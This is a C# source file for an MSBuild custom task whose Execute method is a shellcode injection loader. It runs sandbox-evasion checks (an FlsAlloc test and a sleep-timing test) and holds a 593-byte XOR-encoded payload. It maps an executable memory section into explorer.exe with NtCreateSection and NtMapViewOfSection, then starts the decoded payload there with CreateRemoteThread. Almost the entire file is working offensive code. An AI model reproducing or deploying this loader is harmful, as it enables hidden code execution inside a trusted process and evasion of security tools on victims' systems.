using System;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
using System.Runtime.InteropServices;
using System.Text;

namespace MyTasks
{
    public class SimpleTask : Task
    {

        public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        public const UInt32 SECTION_QUERY = 0x0001;
        public const UInt32 SECTION_MAP_WRITE = 0x0002;
        public const UInt32 SECTION_MAP_READ = 0x0004;
        public const UInt32 SECTION_MAP_EXECUTE = 0x0008;
        public const UInt32 SECTION_EXTEND_SIZE = 0x0010;
        public const UInt32 SECTION_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED | SECTION_QUERY | SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_EXTEND_SIZE;

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 NtCreateSection(
            ref IntPtr SectionHandle,
            UInt32 DesiredAccess,
            IntPtr ObjectAttributes,
            ref UInt32 MaximumSize,
            UInt32 SectionPageProtection,
            UInt32 AllocationAttributes,
            IntPtr FileHandle
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            UIntPtr ZeroBits,
            UIntPtr CommitSize,
            out ulong SectionOffset,
            out uint ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(
            IntPtr hProc,
            IntPtr baseAddr
        );

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(
            IntPtr hObject
        );

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter, uint dwCreationFlags,
            IntPtr lpThreadId
        );
        [DllImport("kernel32.dll")]
        static extern IntPtr FlsAlloc(IntPtr lpCallback);

        public override bool Execute()
        {
            IntPtr x = FlsAlloc(IntPtr.Zero);
            if ((uint)x == 0xFFFFFFFF) { return true; };
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5) { return true; }
            // get process by name
            Process[] localByName = Process.GetProcessesByName("explorer");
            int Id = localByName[0].Id;
            // inject with dynamic id

            byte[] buf = new byte[593] {
0xd6, 0x62, 0xa9, 0xce, 0xda, 0xc2, 0xe6, 0x2a, 0x2a, 0x2a, 0x6b, 0x7b, 0x6b,
0x7a, 0x78, 0x62, 0x1b, 0xf8, 0x7b, 0x7c, 0x4f, 0x62, 0xa1, 0x78, 0x4a,
0x62, 0xa1, 0x78, 0x32, 0x62, 0xa1, 0x78, 0x0a, 0x67, 0x1b, 0xe3, 0x62,
0xa1, 0x58, 0x7a, 0x62, 0x25, 0x9d, 0x60, 0x60, 0x62, 0x1b, 0xea, 0x86,
0x16, 0x4b, 0x56, 0x28, 0x06, 0x0a, 0x6b, 0xeb, 0xe3, 0x27, 0x6b, 0x2b,
0xeb, 0xc8, 0xc7, 0x78, 0x62, 0xa1, 0x78, 0x0a, 0x6b, 0x7b, 0xa1, 0x68,
0x16, 0x62, 0x2b, 0xfa, 0x4c, 0xab, 0x52, 0x32, 0x21, 0x28, 0x25, 0xaf,
0x58, 0x2a, 0x2a, 0x2a, 0xa1, 0xaa, 0xa2, 0x2a, 0x2a, 0x2a, 0x62, 0xaf,
0xea, 0x5e, 0x4d, 0x62, 0x2b, 0xfa, 0x6e, 0xa1, 0x6a, 0x0a, 0x7a, 0x63,
0x2b, 0xfa, 0xa1, 0x62, 0x32, 0xc9, 0x7c, 0x62, 0xd5, 0xe3, 0x67, 0x1b,
0xe3, 0x6b, 0xa1, 0x1e, 0xa2, 0x62, 0x2b, 0xfc, 0x62, 0x1b, 0xea, 0x6b,
0xeb, 0xe3, 0x27, 0x86, 0x6b, 0x2b, 0xeb, 0x12, 0xca, 0x5f, 0xdb, 0x66,
0x29, 0x66, 0x0e, 0x22, 0x6f, 0x13, 0xfb, 0x5f, 0xf2, 0x72, 0x6e, 0xa1,
0x6a, 0x0e, 0x63, 0x2b, 0xfa, 0x4c, 0x6b, 0xa1, 0x26, 0x62, 0x6e, 0xa1,
0x6a, 0x36, 0x63, 0x2b, 0xfa, 0x6b, 0xa1, 0x2e, 0xa2, 0x6b, 0x72, 0x62,
0x2b, 0xfa, 0x6b, 0x72, 0x74, 0x73, 0x70, 0x6b, 0x72, 0x6b, 0x73, 0x6b,
0x70, 0x62, 0xa9, 0xc6, 0x0a, 0x6b, 0x78, 0xd5, 0xca, 0x72, 0x6b, 0x73,
0x70, 0x62, 0xa1, 0x38, 0xc3, 0x61, 0xd5, 0xd5, 0xd5, 0x77, 0x62, 0x1b,
0xf1, 0x79, 0x63, 0x94, 0x5d, 0x43, 0x44, 0x43, 0x44, 0x4f, 0x5e, 0x2a,
0x6b, 0x7c, 0x62, 0xa3, 0xcb, 0x63, 0xed, 0xe8, 0x66, 0x5d, 0x0c, 0x2d,
0xd5, 0xff, 0x79, 0x79, 0x62, 0xa3, 0xcb, 0x79, 0x70, 0x67, 0x1b, 0xea,
0x67, 0x1b, 0xe3, 0x79, 0x79, 0x63, 0x90, 0x10, 0x7c, 0x53, 0x8d, 0x2a,
0x2a, 0x2a, 0x2a, 0xd5, 0xff, 0xc2, 0x3a, 0x2a, 0x2a, 0x2a, 0x1b, 0x13,
0x18, 0x04, 0x1b, 0x1c, 0x12, 0x04, 0x1b, 0x13, 0x1b, 0x04, 0x18, 0x18,
0x1c, 0x2a, 0x70, 0x62, 0xa3, 0xeb, 0x63, 0xed, 0xea, 0x91, 0x2b, 0x2a,
0x2a, 0x67, 0x1b, 0xe3, 0x79, 0x79, 0x40, 0x29, 0x79, 0x63, 0x90, 0x7d,
0xa3, 0xb5, 0xec, 0x2a, 0x2a, 0x2a, 0x2a, 0xd5, 0xff, 0xc2, 0x0c, 0x2a,
0x2a, 0x2a, 0x05, 0x4d, 0x18, 0x6b, 0x40, 0x48, 0x07, 0x7a, 0x07, 0x59,
0x4f, 0x65, 0x49, 0x46, 0x70, 0x18, 0x72, 0x07, 0x12, 0x66, 0x7d, 0x6e,
0x4d, 0x47, 0x6b, 0x65, 0x5d, 0x1e, 0x13, 0x4d, 0x1a, 0x75, 0x5c, 0x1d,
0x69, 0x66, 0x46, 0x2a, 0x62, 0xa3, 0xeb, 0x79, 0x70, 0x6b, 0x72, 0x67,
0x1b, 0xe3, 0x79, 0x62, 0x92, 0x2a, 0x18, 0x82, 0xae, 0x2a, 0x2a, 0x2a,
0x2a, 0x7a, 0x79, 0x79, 0x63, 0xed, 0xe8, 0xc1, 0x7f, 0x04, 0x11, 0xd5,
0xff, 0x62, 0xa3, 0xec, 0x40, 0x20, 0x75, 0x62, 0xa3, 0xdb, 0x40, 0x35,
0x70, 0x78, 0x42, 0xaa, 0x19, 0x2a, 0x2a, 0x63, 0xa3, 0xca, 0x40, 0x2e,
0x6b, 0x73, 0x63, 0x90, 0x5f, 0x6c, 0xb4, 0xac, 0x2a, 0x2a, 0x2a, 0x2a,
0xd5, 0xff, 0x67, 0x1b, 0xea, 0x79, 0x70, 0x62, 0xa3, 0xdb, 0x67, 0x1b,
0xe3, 0x67, 0x1b, 0xe3, 0x79, 0x79, 0x63, 0xed, 0xe8, 0x07, 0x2c, 0x32,
0x51, 0xd5, 0xff, 0xaf, 0xea, 0x5f, 0x35, 0x62, 0xed, 0xeb, 0xa2, 0x39,
0x2a, 0x2a, 0x63, 0x90, 0x6e, 0xda, 0x1f, 0xca, 0x2a, 0x2a, 0x2a, 0x2a,
0xd5, 0xff, 0x62, 0xd5, 0xe5, 0x5e, 0x28, 0xc1, 0x80, 0xc2, 0x7f, 0x2a,
0x2a, 0x2a, 0x79, 0x73, 0x40, 0x6a, 0x70, 0x63, 0xa3, 0xfb, 0xeb, 0xc8,
0x3a, 0x63, 0xed, 0xea, 0x2a, 0x3a, 0x2a, 0x2a, 0x63, 0x90, 0x72, 0x8e,
0x79, 0xcf, 0x2a, 0x2a, 0x2a, 0x2a, 0xd5, 0xff, 0x62, 0xb9, 0x79, 0x79,
0x62, 0xa3, 0xcd, 0x62, 0xa3, 0xdb, 0x62, 0xa3, 0xf0, 0x63, 0xed, 0xea,
0x2a, 0x0a, 0x2a, 0x2a, 0x63, 0xa3, 0xd3, 0x63, 0x90, 0x38, 0xbc, 0xa3,
0xc8, 0x2a, 0x2a, 0x2a, 0x2a, 0xd5, 0xff, 0x62, 0xa9, 0xee, 0x0a, 0xaf,
0xea, 0x5e, 0x98, 0x4c, 0xa1, 0x2d, 0x62, 0x2b, 0xe9, 0xaf, 0xea, 0x5f,
0xf8, 0x72, 0xe9, 0x72, 0x40, 0x2a, 0x73, 0x63, 0xed, 0xe8, 0xda, 0x9f,
0x88, 0x7c, 0xd5, 0xff, };

            // set to 0 then will be the point of the memory section
            IntPtr handleSection = IntPtr.Zero;

            // handle of explorer id
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, Id);
            uint maxSize = (uint)buf.Length;
            // https://learn.microsoft.com/en-us/windows/win32/sync/synchronization-object-security-and-access-rights

            uint PAGE_EXECUTE_READWRITE = 0x40;
            uint SEC_COMMIT = 0x8000000;
            NtCreateSection(ref handleSection, SECTION_ALL_ACCESS, IntPtr.Zero, ref maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);
            Console.WriteLine($" handle section {handleSection}");
            Console.WriteLine($" handle explorer {hProcess}");

            IntPtr address_memory_own_process = IntPtr.Zero;
            IntPtr address_memory_explorer = IntPtr.Zero;
            uint viewsize = 0;
            ulong sectionOffset = 0;
            uint allocation = 0;

            uint status;

            // map section into our own process
            status = NtMapViewOfSection(
                   handleSection,
                   GetCurrentProcess(),
                   ref address_memory_own_process,
                   UIntPtr.Zero,
                   UIntPtr.Zero,
                   out sectionOffset,
                   out viewsize,
                   2,
                   allocation,
                   PAGE_EXECUTE_READWRITE
               );

            Console.WriteLine($" address memory of map in current process  0x{address_memory_own_process}");

            // map it to explorer process
            status = NtMapViewOfSection(
                   handleSection,
                   hProcess,
                   ref address_memory_explorer,
                   UIntPtr.Zero,
                   UIntPtr.Zero,
                   out sectionOffset,
                   out viewsize,
                   2,
                   allocation,
                   PAGE_EXECUTE_READWRITE
               );

            Console.WriteLine($" address memory of map in remote process  0x{address_memory_explorer} id {Id}");

            for (int i = 0; i < buf.Length; i++) { buf[i] = (byte)(buf[i] ^ 0x2a); }
            // copy bytes array into unmanaged memory in our map view
            Marshal.Copy(buf, 0, address_memory_own_process, buf.Length);


            // IntPtr outSize
            CreateRemoteThread(hProcess, IntPtr.Zero, 0, address_memory_explorer, IntPtr.Zero, 0, IntPtr.Zero);
            return true;
        }
    }
}